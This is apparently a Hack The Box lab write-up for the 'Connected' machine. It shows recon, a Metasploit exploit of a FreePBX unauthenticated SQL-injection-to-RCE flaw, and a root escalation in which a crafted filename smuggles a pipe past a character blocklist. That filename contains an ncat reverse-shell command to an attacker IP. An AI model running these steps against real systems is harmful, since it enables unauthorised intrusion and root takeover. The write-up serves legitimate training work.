# Connected — HTB Machine

**Platform:** Hack The Box
**Difficulty:** Hard
**Type:** Linux Machine (CentOS, FreePBX/Asterisk)
**Objective:** Obtain user and root flags
**Key Vulnerabilities:** CVE-2025-57819 (FreePBX unauthenticated SQLi → RCE) → `incrond` hook abuse via unfiltered pipe character
**Status:** ✅ Completed

---

## Attack Flow

```text
Nmap --> 22 (ssh), 80 (http), 443 (https)
Web page --> FreePBX 16.0.40.7 identified
CVE-2025-57819 --> Metasploit SQLi-to-RCE --> meterpreter (asterisk)
Stabilize shell --> user.txt
ps aux --> incrond running as root
/etc/incron.d/ --> watched, writable spool directory
sysadmin_manager filters most chars but not "|"
Filename-based payload --> reverse shell as root --> root.txt
```

---

## 1. Recon

```bash
ping -c 4 10.129.62.204
nmap -sS -n -Pn -oN scan -F 10.129.62.204
```

```text
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

```bash
nmap -sS -n -Pn -oN scanversions -A -p 22,80,443 10.129.62.204
```

Apache 2.4.6 (CentOS), PHP 7.4.16, SSL cert `commonName=pbxconnect`.

---

## 2. Fingerprinting

![FreePBX administration panel](connected-1-freepbx-admin-panel.png)

Footer discloses: **FreePBX 16.0.40.7**

---

## 3. Exploitation — CVE-2025-57819

Unauthenticated SQL injection + auth bypass chained into RCE, exploited via Metasploit:

```bash
msfconsole
use exploit/unix/http/freepbx_unauth_sqli_to_rce
set RHOSTS 10.129.62.204
set RPORT 80
set LHOST <attacker-ip>
set VHOST connected.htb
check
exploit
```

```text
[+] The target is vulnerable. Detected SQL injection
[*] Meterpreter session 1 opened
```

```text
meterpreter > getuid
Server username: asterisk
```

Stabilize:

```bash
meterpreter > shell
script /dev/null -c /bin/bash
```

---

## 4. User Flag

```bash
[asterisk@connected ~]$ cat user.txt
```

✅ User flag obtained.

---

## 5. Root — Incron Privileged Hook Abuse

```bash
ps aux
```

```text
root  762  ... /usr/sbin/incrond
```

`incrond` runs as root and watches a directory writable by `asterisk`:

```bash
cat /etc/incron.d/*
```

```text
/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```

```bash
ls -la /var/spool/asterisk/incron/
touch /var/spool/asterisk/incron/test   # confirm writable
```

`sysadmin_manager` validates a GPG signature on triggered hooks, so a valid signed hook is needed as an anchor:

```bash
find /var/www/html/admin/modules/*/hooks/ -type f | grep logrotate
```

The script filters `` ` ' " $ > < & ; `` but **not the pipe (`|`)**. Start a listener:

```bash
nc -lvnp 4444
```

Trigger the hook via a crafted filename:

```bash
touch "/var/spool/asterisk/incron/core.logrotate.x|ncat 10.10.17.1 4444 --sh-exec bash"
```

`incrond` runs `sysadmin_manager` as root against the filename, and the embedded pipe spawns a root reverse shell.

```bash
script /dev/null -c /bin/bash
id
# uid=0(root)
cat root.txt
```

✅ Root flag obtained — machine fully completed.

---

## Why It Works

- CVE-2025-57819 allows full RCE with no valid FreePBX credentials
- `incrond` runs as root and watches a directory writable by a lower-privileged account
- Blocklist filtering in `sysadmin_manager` misses the pipe character entirely
- Untrusted filenames reach a shell-interpreted command, turning file creation into code execution

---

## References

- CVE-2025-57819 — FreePBX unauthenticated SQL injection to RCE
- incron / inotify-based cron documentation
